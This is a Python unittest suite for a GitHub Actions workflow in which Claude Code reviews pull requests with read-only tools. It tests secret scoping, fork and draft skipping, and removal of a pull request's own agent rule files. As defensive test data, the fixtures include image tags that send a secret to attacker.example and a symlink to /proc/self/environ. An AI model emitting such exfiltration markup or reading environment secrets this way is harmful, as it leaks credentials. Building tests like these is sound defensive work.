"""Run with: python3 -m unittest discover -s tests"""
import os
import re
import subprocess
import sys
import tempfile
import textwrap
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import test_review_pr_workflow as single  # noqa: E402 (the import needs tests/ on the path first)

ROOT = Path(__file__).resolve().parent.parent
WORKFLOW = ROOT / ".github" / "workflows" / "review-pr.yml"
README = ROOT / "examples" / "ci" / "README.md"

CREDENTIAL = "Fail when the harness has no credential"
HARNESS = "Check out the harness"
HARNESS_SHA = "Say which harness commit reviews"
BASE = "Check out the pull request's base"
HEAD = "Check out the pull request's head"
PROMPT = "Run the review-pr skill: build the prompt"
CLAUDE = "Run the review-pr skill on Claude"
POST = "Post the report as one comment"
RULES = "Remove the pull request's own rules"
DRAFT = "Skip a draft pull request"
DRAFT_NOTICE = "::notice::This pull request is a draft, so the review skips until it's marked ready for review."


def children(text, key):
    """The keys directly under a top-level `key:`, by their indent."""
    lines = text.splitlines()
    start = next(i for i, line in enumerate(lines) if line == key + ":")
    out = []
    for line in lines[start + 1:]:
        if line.strip() and not line.startswith(" "):
            break
        match = re.match(r"^  ([a-z_-]+):", line)
        if match:
            out.append(match.group(1))
    return out


def fenced(text, language):
    """The bodies of the ```language fences in a Markdown file."""
    return re.findall(r"^```{}\n(.*?)^```".format(re.escape(language)), text, re.M | re.S)


class ReusableReviewWorkflow(unittest.TestCase):
    steps = single.ReviewPrWorkflow.steps
    step = single.ReviewPrWorkflow.step
    run_step = single.ReviewPrWorkflow.run_step

    def setUp(self):
        self.assertTrue(WORKFLOW.is_file(), ".github/workflows/review-pr.yml doesn't exist")
        self.text = WORKFLOW.read_text()
        self.code = single.code(self.text)

    def names(self):
        return [name for name, _ in self.steps()]

    def secrets_in(self, name):
        return set(re.findall(r"secrets\.(\w+)", self.step(name)))

    def run_in(self, name, cwd, **env):
        """Run a step's script from `cwd`, as Actions would from the workspace."""
        script = self.step(name).split("run: |\n", 1)[1]
        return subprocess.run(["bash", "--noprofile", "--norc", "-eo", "pipefail", "-c", textwrap.dedent(script)],
                              cwd=cwd, env={"PATH": os.environ["PATH"], **env}, capture_output=True, text=True)

    def test_it_runs_only_when_another_workflow_calls_it(self):
        self.assertEqual(children(self.code, "on"), ["workflow_call"])
        self.assertNotIn("pull_request_target", self.text)

    def test_it_takes_the_factory_repo_and_three_optional_secrets(self):
        on = self.code.split("\non:\n", 1)[1].split("\npermissions:", 1)[0]
        self.assertRegex(on, r"factory-repo:\n(?:\s+\S.*\n)*?\s+required: true\n(?:\s+\S.*\n)*?\s+type: string")
        for name in ("ANTHROPIC_API_KEY", "CLAUDE_CODE_OAUTH_TOKEN", "FACTORY_DEPLOY_KEY"):
            self.assertRegex(on, r"{}:\n(?:\s+description: .*\n)?\s+required: false".format(name))

    def test_the_old_ci_names_are_gone(self):
        for old in ("harness-repo", "HARNESS_DEPLOY_KEY", "HARNESS_REPO"):
            self.assertNotIn(old, self.text)

    def test_permissions_are_read_contents_and_write_comments_only(self):
        self.assertEqual(sorted(single.block(self.code, "permissions")), ["contents: read", "pull-requests: write"])
        self.assertEqual(len(re.findall(r"^\s*permissions:", self.code, re.M)), 1)
        self.assertNotIn("write-all", self.text)

    def test_claude_runs_restricted_with_read_tools_only(self):
        call = re.search(r"claude -p[^<]*", self.step(CLAUDE))
        self.assertIsNotNone(call, "no claude -p call")
        self.assertEqual(call.group(0).split(),
                         ["claude", "-p", "--max-turns", "30", "--restricted", "--strict-mcp-config",
                          "--tools", "Read,Grep,Glob", "\\"])
        self.assertIn("npm install -g @anthropic-ai/claude-code@2.1.296", self.code)
        self.assertIn('cd "$GITHUB_WORKSPACE"', self.step(CLAUDE))
        self.assertIn('grep -qF -e "$ANTHROPIC_API_KEY"', self.step(CLAUDE))

    def test_claude_is_the_only_reviewer_and_gets_no_shell(self):
        self.assertIsNone(re.search(r"codex|ollama", self.text, re.I))
        self.assertNotRegex(self.text, r"\bBash\b")
        self.assertNotIn("--allowedTools", self.text)
        self.assertNotIn("--dangerously-skip-permissions", self.text)

    def test_no_expression_is_expanded_inside_a_script(self):
        self.assertTrue(single.run_lines(self.code), "found no run: blocks to check")
        for line in single.run_lines(self.code):
            self.assertNotIn("${{", line, "pass it through env: and read it as a variable")

    def test_secrets_are_only_ever_referenced_by_name(self):
        for number, line in enumerate(self.text.splitlines(), 1):
            self.assertNotIn("secrets.", single.SECRET_REF.sub("", line), "line {}".format(number))
        self.assertIsNone(single.KEY_SHAPES.search(self.text), "something in the file looks like a key")

    def test_a_missing_deploy_key_fails_and_names_it(self):
        result, output, _ = self.run_step(CREDENTIAL, FACTORY_DEPLOY_KEY="")
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("::error::", result.stdout)
        self.assertIn("FACTORY_DEPLOY_KEY", result.stdout)
        self.assertEqual(output, "")
        result, output, _ = self.run_step(CREDENTIAL, FACTORY_DEPLOY_KEY="k")
        self.assertEqual(result.returncode, 0, result.stdout)

    def test_a_missing_anthropic_key_skips_with_a_notice(self):
        result, _, added = self.run_step("Skip when Claude has no key")
        self.assertEqual(result.returncode, 0)
        self.assertIn("REVIEW_SKIPPED=true", added)
        self.assertIn("::notice::", result.stdout)
        self.assertIn("CLAUDE_CODE_OAUTH_TOKEN", result.stdout)

    def test_a_subscription_token_alone_runs_the_review(self):
        result, _, added = self.run_step("Skip when Claude has no key", CLAUDE_CODE_OAUTH_TOKEN="t")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertNotIn("REVIEW_SKIPPED", added)

    def review_with(self, report, **env):
        """Run the Claude step with a stand-in claude that writes `report`. Returns it and whether a report is left."""
        with tempfile.TemporaryDirectory() as tmp:
            bin_dir = Path(tmp) / "bin"
            bin_dir.mkdir()
            (bin_dir / "claude").write_text("#!/bin/sh\ncat > /dev/null\nprintf '%s\\n' \"$FAKE_REPORT\"\n")
            (bin_dir / "claude").chmod(0o755)
            (Path(tmp) / "prompt.md").write_text("review\n")
            result = self.run_in(CLAUDE, tmp, PATH=f"{bin_dir}:{os.environ['PATH']}", RUNNER_TEMP=tmp,
                                 GITHUB_WORKSPACE=tmp, FAKE_REPORT=report, **env)
            return result, (Path(tmp) / "report.md").exists()

    def test_a_report_holding_either_credential_is_not_posted(self):
        for name in ("ANTHROPIC_API_KEY", "CLAUDE_CODE_OAUTH_TOKEN"):
            result, kept = self.review_with("Looks fine. cred-123", **{name: "cred-123"})
            self.assertNotEqual(result.returncode, 0, name)
            self.assertFalse(kept, name)
            self.assertIn("::error::", result.stdout, name)
            self.assertNotIn("cred-123", result.stdout + result.stderr, name)

    def test_a_clean_report_with_one_credential_set_is_kept(self):
        for name in ("ANTHROPIC_API_KEY", "CLAUDE_CODE_OAUTH_TOKEN"):
            result, kept = self.review_with("Looks fine.", **{name: "cred-123"})
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertTrue(kept, name)

    def test_a_pull_request_from_a_fork_skips_with_a_notice(self):
        result, output, _ = self.run_step("Skip a pull request from a fork", HEAD_REPO="fork/r", THIS_REPO="o/r")
        self.assertEqual(result.returncode, 0)
        self.assertIn("review=false", output)
        self.assertIn("::notice::", result.stdout)
        result, output, _ = self.run_step("Skip a pull request from a fork")
        self.assertIn("review=true", output)

    def test_the_fork_check_compares_with_the_calling_repo(self):
        scope = self.step("Skip a pull request from a fork")
        self.assertIn("THIS_REPO: ${{ github.repository }}", scope)
        self.assertIn("HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}", scope)
        self.assertNotIn("harness", scope)

    def test_the_steps_run_in_the_planned_order(self):
        names = self.names()
        order = ["Skip a pull request from a fork", DRAFT, "Skip when Claude has no key", CREDENTIAL, HARNESS,
                 HARNESS_SHA, BASE, HEAD, "Remove the pull request's own rules", PROMPT, CLAUDE, POST]
        self.assertEqual([name for name in names if name in order], order)

    def test_a_skipped_review_runs_nothing_after_the_key_check(self):
        names = self.names()
        for name, text in self.steps()[names.index("Skip when Claude has no key") + 1:]:
            self.assertIn("steps.scope.outputs.review == 'true'", text, name)
            self.assertIn("env.REVIEW_SKIPPED != 'true'", text, name)
        self.assertNotIn("always()", self.code)

    def test_a_draft_skips_with_a_notice(self):
        result, _, added = self.run_step(DRAFT, DRAFT="true")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("REVIEW_SKIPPED=true", added)
        self.assertIn(DRAFT_NOTICE, result.stdout)

    def test_a_pull_request_that_is_not_a_draft_goes_on(self):
        result, _, added = self.run_step(DRAFT, DRAFT="false")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(added, "")
        self.assertNotIn("::notice::", result.stdout)
        present = "k"
        result, _, added = self.run_step("Skip when Claude has no key", ANTHROPIC_API_KEY=present)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertNotIn("REVIEW_SKIPPED", added)

    def test_a_draft_runs_nothing_after_it(self):
        names = self.names()
        after = self.steps()[names.index(DRAFT) + 1:]
        self.assertTrue(after, "no steps after the draft check")
        for name, text in after:
            if_line = next((line for line in text.splitlines() if line.strip().startswith("if:")), "")
            self.assertIn("env.REVIEW_SKIPPED != 'true'", if_line, name)
        draft = self.step(DRAFT)
        env = draft.split("env:\n", 1)[1].split("run: |", 1)[0]
        self.assertIn("DRAFT: ${{ github.event.pull_request.draft }}", env)

    def test_a_fork_never_reaches_the_draft_check(self):
        if_lines = [line.strip() for line in self.step(DRAFT).splitlines() if line.strip().startswith("if:")]
        self.assertEqual(if_lines, ["if: steps.scope.outputs.review == 'true'"])

    def test_the_harness_comes_from_its_default_branch_with_the_deploy_key(self):
        harness = self.step(HARNESS)
        self.assertIn("repository: ${{ inputs.factory-repo }}", harness)
        self.assertIn("ssh-key: ${{ secrets.FACTORY_DEPLOY_KEY }}", harness)
        self.assertIn("path: harness", harness)
        self.assertIn("persist-credentials: false", harness)
        self.assertNotRegex(harness, r"(?m)^\s+ref:")
        sha = self.step(HARNESS_SHA)
        self.assertIn('echo "Harness commit: $(git -C harness rev-parse HEAD)"', sha)
        self.assertIn("harness/skills/review-pr/SKILL.md", sha)
        self.assertIn("::error::", sha)
        self.assertIn("FACTORY_DEPLOY_KEY", sha)
        self.assertIn("inputs.factory-repo", sha)
        self.assertRegex(sha, r"exit [1-9]")

    def test_a_harness_without_the_skill_fails(self):
        result, _, _ = self.run_step(HARNESS_SHA, FACTORY_REPO="o/not-a-harness")
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("o/not-a-harness", result.stdout)

    def test_the_project_s_rules_come_from_its_base(self):
        base = self.step(BASE)
        self.assertIn("ref: ${{ github.event.pull_request.base.sha }}", base)
        self.assertIn("path: base", base)
        head = self.step(HEAD)
        self.assertIn("path: head", head)
        self.assertIn("fetch-depth: 0", head)
        for name in (BASE, HEAD):
            self.assertIn("persist-credentials: false", self.step(name), name)
            self.assertNotIn("ssh-key", self.step(name), name)
        self.assertIn("find head", self.step(RULES))

    def test_the_pull_request_s_rules_go_at_any_depth(self):
        with tempfile.TemporaryDirectory() as tmp:
            head = Path(tmp) / "head"
            gone = ["AGENTS.md", "CLAUDE.md", "CLAUDE.local.md", "src/CLAUDE.md", "src/CLAUDE.local.md",
                    "deep/a/AGENTS.md", ".claude/settings.json", "src/.claude/agents/x.md"]
            kept = ["README.md", "src/app.py", "docs/CLAUDE.md.txt", ".git/config", ".git/CLAUDE.md"]
            for path in gone + kept:
                (head / path).parent.mkdir(parents=True, exist_ok=True)
                (head / path).write_text("x")
            (head / "docs" / "CLAUDE.md").symlink_to("../README.md")
            (head / "environ").symlink_to("/proc/self/environ")
            (head / "outside").symlink_to(tmp)
            result = self.run_in(RULES, tmp)
            self.assertEqual(result.returncode, 0, result.stderr)
            for path in gone + ["docs/CLAUDE.md", "environ", "outside", ".claude", "src/.claude"]:
                self.assertFalse(os.path.lexists(head / path), path)
            for path in kept:
                self.assertTrue((head / path).is_file(), path)

    def test_the_posted_report_carries_no_image(self):
        with tempfile.TemporaryDirectory() as tmp:
            bin_dir = Path(tmp) / "bin"
            bin_dir.mkdir()
            (bin_dir / "gh").write_text("#!/bin/sh\nexit 0\n")
            (bin_dir / "gh").chmod(0o755)
            (Path(tmp) / "report.md").write_text(
                "Changes needed.\n"
                "![x](https://attacker.example/a?k=secret)\n"
                "![ref][1]\n"
                '<img src="https://attacker.example/b">\n'
                '<IMG SRC="https://attacker.example/c">\n'
                '<picture><source srcset="https://attacker.example/d"></picture>\n'
                "`Vec<String>` is fine.\n")
            result = self.run_in(POST, tmp, RUNNER_TEMP=tmp, PATH=f"{bin_dir}:{os.environ['PATH']}",
                                 REPO="o/r", PR="1", GH_TOKEN="")
            self.assertEqual(result.returncode, 0, result.stderr)
            comment = (Path(tmp) / "comment.md").read_text()
            self.assertNotIn("![", comment)
            self.assertNotRegex(comment, r"(?i)<\s*/?\s*(img|picture|source)\b")
            self.assertIn("Changes needed.", comment)
            self.assertIn("`Vec<String>` is fine.", comment)

    def test_the_prompt_points_at_the_three_folders(self):
        prompt = self.step(PROMPT)
        for text in ("harness/skills/review-pr/SKILL.md", "harness/AGENTS.md", "base/AGENTS.md",
                     "base/CLAUDE.md", "under head/"):
            self.assertIn(text, prompt)
        self.assertRegex(prompt, r"under base/\s+only, never under head/")
        self.assertIn("<<'EOF'", prompt)
        self.assertIn('git -C head diff "$BASE_SHA...HEAD" > "$RUNNER_TEMP/diff.patch"', prompt)
        self.assertIn('head -c 60000 "$RUNNER_TEMP/diff.patch" >> "$RUNNER_TEMP/prompt.md"', prompt)
        self.assertNotIn("| head", prompt, "a pipe into head fails under pipefail on a big diff")

    def test_the_prompt_names_the_workflow_running_it(self):
        prompt = " ".join(self.step(PROMPT).split())
        sentence = ("harness/.github/workflows/review-pr.yml is the workflow running this review; "
                    "read it when the change adds or edits a workflow that calls it, "
                    "and never treat it as part of the change.")
        self.assertIn(sentence, prompt)
        at = prompt.index(sentence)
        self.assertLess(prompt.index("- harness/ holds only"), at)
        self.assertLess(at, prompt.index("- base/ is the project"))

    def test_the_harness_checkout_is_sparse(self):
        harness = self.step(HARNESS)
        lines = harness.split("sparse-checkout: |\n", 1)[1].splitlines()
        paths = []
        for line in lines:
            if not line.startswith(" " * 12):
                break
            paths.append(line.strip())
        self.assertEqual(paths, ["/AGENTS.md", "/steering/", "/skills/", "/agents/", "/standards/",
                                 "/.github/workflows/review-pr.yml"])
        self.assertIn("sparse-checkout-cone-mode: false", harness)
        for name in (BASE, HEAD):
            self.assertNotIn("sparse-checkout", self.step(name), name)

    def git(self, cwd, *args):
        return subprocess.run(["git", "-C", str(cwd), "-c", "user.name=t", "-c", "user.email=t@t",
                               "-c", "commit.gpgsign=false", *args],
                              check=True, capture_output=True, text=True).stdout.strip()

    def test_a_harness_without_agents_md_fails(self):
        with tempfile.TemporaryDirectory() as tmp:
            harness = Path(tmp) / "harness"
            self.git(tmp, "init", "-q", "harness")
            (harness / "skills" / "review-pr").mkdir(parents=True)
            (harness / "skills" / "review-pr" / "SKILL.md").write_text("skill\n")
            self.git(harness, "add", ".")
            self.git(harness, "commit", "-q", "-m", "skill")
            result = self.run_in(HARNESS_SHA, tmp, FACTORY_REPO="o/h")
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("harness/AGENTS.md", result.stdout)
            (harness / "AGENTS.md").write_text("rules\n")
            result = self.run_in(HARNESS_SHA, tmp, FACTORY_REPO="o/h")
            self.assertEqual(result.returncode, 0, result.stdout)

    def prompt_for(self, big, standards=None):
        """The prompt and the GITHUB_ENV text built for a head commit that changes small.txt,
        and adds big.txt when `big`. `standards` are paths created under harness/standards/."""
        with tempfile.TemporaryDirectory() as tmp:
            if standards is not None:
                (Path(tmp) / "harness" / "standards").mkdir(parents=True)
                for path in standards:
                    (Path(tmp) / "harness" / "standards" / path).parent.mkdir(parents=True, exist_ok=True)
                    (Path(tmp) / "harness" / "standards" / path).write_text("# A standard\n")
            env = Path(tmp) / "env"
            env.touch()
            head = Path(tmp) / "head"
            self.git(tmp, "init", "-q", "head")
            (head / "small.txt").write_text("one\n")
            self.git(head, "add", ".")
            self.git(head, "commit", "-q", "-m", "base")
            base = self.git(head, "rev-parse", "HEAD")
            (head / "small.txt").write_text("two\n")
            if big:
                (head / "big.txt").write_text(("x" * 99 + "\n") * 700)
            self.git(head, "add", ".")
            self.git(head, "commit", "-q", "-m", "change")
            result = self.run_in(PROMPT, tmp, BASE_SHA=base, RUNNER_TEMP=tmp, GITHUB_ENV=str(env))
            self.assertEqual(result.returncode, 0, result.stderr)
            return (Path(tmp) / "prompt.md").read_text(), env.read_text()

    CUT = ("The diff was cut at 60000 bytes. Every changed file is listed under CHANGED FILES; "
           "read any the cut dropped under head/.")
    READ_EACH = ("These are the team's code standards. Read each one, hold the change to them, "
                 "and name the file and heading of the standard a finding breaks.")
    NO_STANDARDS = "None. The harness has no standards/ folder, or nothing in it."
    NOT_LOADED = ("No team standards were loaded: the harness's standards/ folder is missing or empty, "
                  "so this review holds the change to the repo's own rules only.")

    def standards_section(self, prompt):
        self.assertIn("\nSTANDARDS:\n", prompt)
        return prompt.split("\nSTANDARDS:\n", 1)[1].split("\nCHANGED FILES:", 1)[0].splitlines()

    def test_the_standards_are_listed_in_order(self):
        prompt, env = self.prompt_for(big=False, standards=["python.md", "api/errors.md", "README.md"])
        self.assertEqual(self.standards_section(prompt),
                         ["harness/standards/api/errors.md", "harness/standards/python.md", self.READ_EACH])
        self.assertFalse([line for line in self.standards_section(prompt) if "README.md" in line])
        self.assertNotIn("standards/README.md", prompt)
        self.assertIn("STANDARDS_LOADED=true", env)
        self.assertNotIn("STANDARDS_LOADED=false", env)

    def test_no_standards_says_none(self):
        for standards in (None, ["README.md"]):
            prompt, env = self.prompt_for(big=False, standards=standards)
            section = self.standards_section(prompt)
            self.assertIn(self.NO_STANDARDS, section, standards)
            self.assertNotIn(self.READ_EACH, prompt, standards)
            self.assertIn("STANDARDS_LOADED=false", env, standards)
            self.assertNotIn("STANDARDS_LOADED=true", env, standards)

    def test_the_posted_report_says_when_no_standards_loaded(self):
        for loaded in ("false", "true"):
            with tempfile.TemporaryDirectory() as tmp:
                bin_dir = Path(tmp) / "bin"
                bin_dir.mkdir()
                (bin_dir / "gh").write_text("#!/bin/sh\nexit 0\n")
                (bin_dir / "gh").chmod(0o755)
                (Path(tmp) / "report.md").write_text("Changes needed.\n")
                result = self.run_in(POST, tmp, RUNNER_TEMP=tmp, PATH=f"{bin_dir}:{os.environ['PATH']}",
                                     REPO="o/r", PR="1", GH_TOKEN="", STANDARDS_LOADED=loaded)
                self.assertEqual(result.returncode, 0, result.stderr)
                lines = (Path(tmp) / "comment.md").read_text().splitlines()
                if loaded == "false":
                    self.assertEqual(lines[2:5], [self.NOT_LOADED, "", "Changes needed."])
                else:
                    self.assertNotIn(self.NOT_LOADED, lines)
                    self.assertEqual(lines[2], "Changes needed.")

    def test_a_big_diff_lists_every_file_and_says_it_was_cut(self):
        prompt, _ = self.prompt_for(big=True)
        self.assertIn("CHANGED FILES:", prompt)
        listed = prompt.split("CHANGED FILES:", 1)[1].split("\nDIFF (cut", 1)[0]
        self.assertIn("A\tbig.txt", listed)
        self.assertIn("M\tsmall.txt", listed)
        self.assertTrue(prompt.strip().endswith(self.CUT), prompt[-300:])

    def test_a_small_diff_has_no_cut_line(self):
        prompt, _ = self.prompt_for(big=False)
        self.assertIn("CHANGED FILES:", prompt)
        self.assertIn("M\tsmall.txt", prompt.split("CHANGED FILES:", 1)[1].split("\nDIFF (cut", 1)[0])
        self.assertNotIn(self.CUT, prompt)

    def test_the_deploy_key_reaches_only_the_check_and_the_harness_checkout(self):
        holding = [name for name, text in self.steps() if "secrets.FACTORY_DEPLOY_KEY" in text]
        self.assertEqual(sorted(holding), sorted([CREDENTIAL, HARNESS]))
        for name in (PROMPT, CLAUDE, POST):
            self.assertNotIn("FACTORY_DEPLOY_KEY", self.step(name), name)

    def test_each_step_holds_only_its_own_key(self):
        claude = {"ANTHROPIC_API_KEY", "CLAUDE_CODE_OAUTH_TOKEN"}
        self.assertEqual(self.secrets_in(CLAUDE), claude)
        self.assertEqual(self.secrets_in("Skip when Claude has no key"), claude)
        self.assertEqual(self.secrets_in(CREDENTIAL), {"FACTORY_DEPLOY_KEY"})
        for name in (DRAFT, PROMPT, POST, BASE, HEAD, HARNESS_SHA):
            self.assertEqual(self.secrets_in(name), set(), name)

    def test_the_comment_goes_on_the_calling_repo_after_the_checkouts(self):
        post = self.step(POST)
        self.assertIn("REPO: ${{ github.repository }}", post)
        self.assertNotIn("factory-repo", post)
        names = self.names()
        for name in (HARNESS, HARNESS_SHA, BASE, HEAD):
            self.assertLess(names.index(name), names.index(POST), name)

    def test_the_header_says_it_never_approves_or_merges(self):
        header = self.text.split("\nname:", 1)[0]
        self.assertIn("never", header)
        for word in ("approves", "merges", "examples/ci/README.md", "FACTORY_DEPLOY_KEY", "ANTHROPIC_API_KEY",
                     "CLAUDE_CODE_OAUTH_TOKEN", "claude setup-token"):
            self.assertIn(word, header)

    def test_the_header_says_its_main_runs_in_every_caller(self):
        header = " ".join(self.text.split("\nname:", 1)[0].split())
        self.assertIn("runs in every calling repo", header)


class CallerReadme(unittest.TestCase):
    def setUp(self):
        self.assertTrue(README.is_file(), "examples/ci/README.md doesn't exist")
        self.text = README.read_text()

    def test_the_headings_come_in_order(self):
        headings = re.findall(r"^## (.+)$", self.text, re.M)
        self.assertEqual(headings, ["The credential", "The caller", "The secret", "A private factory repo",
                                    "Protecting the factory repo", "Testing the review", "Team standards"])

    def test_the_protecting_section_says_how(self):
        self.assertIn("\n## Protecting the factory repo\n", self.text)
        section = self.text.split("\n## Protecting the factory repo\n", 1)[1].split("\n## ", 1)[0]
        section = " ".join(section.split())
        for word in ("ruleset", "approval", "force push", "admins", "review-pr.yml@<sha>", "rotate"):
            self.assertIn(word, section)
        caller = self.text.split("\n## The caller\n", 1)[1].split("\n## ", 1)[0]
        self.assertIn("(#protecting-the-factory-repo)", caller)

    def test_the_caller_calls_the_workflow_and_passes_both_secrets(self):
        blocks = fenced(self.text, "yaml")
        self.assertEqual(len(blocks), 1, "one ```yaml block, the caller")
        caller = blocks[0]
        self.assertIn("uses: your-org/factory/.github/workflows/review-pr.yml@main", caller)
        self.assertIn("factory-repo: your-org/factory", caller)
        for name in ("ANTHROPIC_API_KEY", "FACTORY_DEPLOY_KEY"):
            self.assertIn("{0}: ${{{{ secrets.{0} }}}}".format(name), caller)
        self.assertIn("types: [opened, synchronize, reopened, ready_for_review]", caller)
        self.assertNotIn("secrets: inherit", caller)
        self.assertNotIn("skills/", caller)
        self.assertNotIn("pull_request_target", caller)

    def test_the_caller_asks_for_the_same_permissions(self):
        caller = fenced(self.text, "yaml")[0]
        self.assertEqual(sorted(single.block(caller, "permissions")), ["contents: read", "pull-requests: write"])
        self.assertIn("group: review-pr-${{ github.event.pull_request.number }}", caller)

    def test_the_key_is_read_only(self):
        credential = self.text.split("## The credential", 1)[1].split("## The caller", 1)[0]
        self.assertIn("Allow write access", credential)
        self.assertIsNone(single.KEY_SHAPES.search(self.text), "something in the README looks like a key")

    def test_it_lists_the_other_examples(self):
        for name in ("loop.yml", "project-checks.yml", "review-pr.yml"):
            self.assertIn("examples/ci/" + name, self.text)

    def test_the_skill_points_at_the_readme(self):
        skill = (ROOT / "skills" / "review-pr" / "SKILL.md").read_text()
        self.assertIn("examples/ci/README.md", skill)


if __name__ == "__main__":
    unittest.main()
